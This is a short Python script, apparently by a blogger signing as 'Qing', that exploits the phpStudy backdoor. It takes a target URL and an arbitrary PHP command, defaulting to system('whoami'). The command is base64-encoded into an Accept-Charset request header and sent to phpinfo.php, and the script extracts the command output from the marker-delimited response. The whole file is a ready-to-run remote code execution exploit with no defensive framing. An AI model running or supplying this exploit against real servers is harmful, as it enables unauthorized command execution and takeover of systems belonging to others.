#!/usr/bin/env python3
#-*- encoding:utf-8 -*-
# 卿 博客:https://www.cnblogs.com/-qing-/

import base64
import requests
import threading
import threadpool
import re

print("======Phpstudy Backdoor Exploit---os-shell============\n")
print("===========By  Qing=================\n")
print("=====Blog：https://www.cnblogs.com/-qing-/==\n")

def os_shell(url,headers,payload):
    try:
        r = requests.get(url=url+'/phpinfo.php',headers=headers,verify=False,timeout=10)
        # print(r.text)
        res = re.findall("qing(.*?)qing",r.text,re.S)
        print("[ + ]===========The Response:==========[ + ]\n")
        res = "".join(res)
        print(res)
    except:
        print("[ - ]===========Failed! Timeout...==========[ - ]\n")

def main():
    url = input("input the Url , example:\"http://127.0.0.1/\"\n")
    payload = input("input the payload , default:echo system(\"whoami\");\n")
    de_payload = "echo \"qing\";system(\"whoami\");echo \"qing\";"
    if payload.strip() == '':
        payload = de_payload
    payload = "echo \"qing\";"+payload+"echo \"qing\";"
    payload = base64.b64encode(payload.encode('utf-8'))
    payload = str(payload, 'utf-8')
    headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'accept-charset': payload,
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    }
    os_shell(url=url,headers=headers,payload=payload)
if __name__ == '__main__':
    main()
